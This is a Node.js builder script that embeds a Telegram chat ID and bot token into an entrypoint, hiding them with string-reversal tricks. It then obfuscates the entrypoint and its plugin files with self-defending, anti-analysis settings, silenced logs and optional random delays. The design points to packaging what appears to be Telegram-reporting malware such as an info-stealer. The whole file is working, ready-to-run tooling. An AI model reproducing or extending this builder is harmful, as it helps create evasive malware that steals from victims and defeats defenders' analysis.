// @ts-check
const fs = require('fs-extra')
const path = require('path')
const JavaScriptObfuscator = require('javascript-obfuscator')

const argv = process.argv.slice(2)

const helpMsg = 'Usage: node builder.js <telegram_chat_id> <telegram_token>'
if (argv[0] === '--help' || argv[0] === '-h') {
  console.log(helpMsg)
  process.exit(0)
}
if (argv.length < 2) {
  console.error(`Error: Pass the Telegram chat ID and token as arguments\n${helpMsg}`)
  process.exit(1)
}

const pluginsDir = path.resolve(__dirname, 'plugins')
const obfuscatedDir = path.resolve(__dirname, 'obfuscated')

const entrypoint = path.resolve(__dirname, 'index.js')

const entrypointObfuscated = path.resolve(obfuscatedDir, 'index.js')
const pluginsObfuscatedDir = path.resolve(obfuscatedDir, 'plugins')

fs.rmSync(obfuscatedDir, { recursive: true })
fs.copySync(path.resolve(__dirname, 'package.json'), path.resolve(obfuscatedDir, 'package.json'))
fs.copySync(entrypoint, entrypointObfuscated)
fs.copySync(pluginsDir, pluginsObfuscatedDir)

const options = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 1,
  identifierNamesGenerator: 'hexadecimal',
  renameGlobals: true,
  selfDefending: true,
  splitStrings: true,
  splitStringsChunkLength: 2,
  stringArray: true,
  // stringArrayEncoding: ['base64'], // makes it crash when packed with pkg
  stringArrayThreshold: 0.9,
  target: 'node',
  transformObjectKeys: true,
  ignoreImports: true,
  disableConsoleOutput: argv[3] !== 'SHOW_LOGS',
  numbersToExpressions: true,
  stringArrayCallsTransform: true,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayWrappersCount: 5,
  stringArrayWrappersChainedCalls: true,
  stringArrayWrappersParametersMaxCount: 5,
  stringArrayWrappersType: 'function',
  unicodeEscapeSequence: true
}

const chatId = argv[0]
const token = argv[1]
const addRandomDelay = argv[2] !== 'false' && argv[2] !== '0' && argv[2] !== 'no'

// Replace Telegram chatId and token, obfuscate it so it's not easily readdable even with good deobfuscation
let entrypointCode = fs.readFileSync(entrypointObfuscated, 'utf8')
// prettier-ignore
const replaced =
  `let c='${`${chatId.split('').reverse().join(',')}+${token.split('').reverse().join('~')}`.split('').reverse().join('#')}';` +
  `run(c.split('#').reverse().join('').split('+')[0].split(',').reverse().join(''),c.split('#').reverse().join('').split('+')[1].split('~').reverse().join(''),${addRandomDelay});`
entrypointCode = entrypointCode.replace(/run\(\'.*?\', \'.*?\', .*?\)/, replaced)

fs.writeFileSync(
  entrypointObfuscated,
  JavaScriptObfuscator.obfuscate(entrypointCode, options).getObfuscatedCode(),
  'utf8'
)
console.log(`Obfuscated entrypoint to ${entrypointObfuscated}`)

fs.readdirSync(pluginsObfuscatedDir, { withFileTypes: true })
  .filter(
    dir =>
      dir.isDirectory() &&
      dir.name.endsWith('-plugin') &&
      fs.readdirSync(path.resolve(pluginsObfuscatedDir, dir.name)).includes('lib.js')
  )
  .forEach(pluginName => {
    const libPath = path.resolve(pluginsObfuscatedDir, pluginName.name, 'lib.js')
    const pluginCode = fs.readFileSync(libPath, 'utf8')
    fs.writeFileSync(libPath, JavaScriptObfuscator.obfuscate(pluginCode, options).getObfuscatedCode(), 'utf8')
    console.log(`Obfuscated plugin [${pluginName.name}] to ${libPath}`)
  })
